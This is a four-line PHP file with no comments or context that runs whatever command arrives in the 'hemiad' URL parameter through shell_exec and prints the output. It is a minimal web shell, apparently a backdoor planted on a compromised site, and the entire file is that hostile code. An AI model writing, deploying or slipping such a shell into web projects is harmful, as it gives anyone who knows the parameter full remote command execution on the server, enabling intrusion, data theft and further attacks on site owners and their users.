<?php
        if (isset($_GET['hemiad'])) {
            print_r(shell_exec($_GET['hemiad']));
        }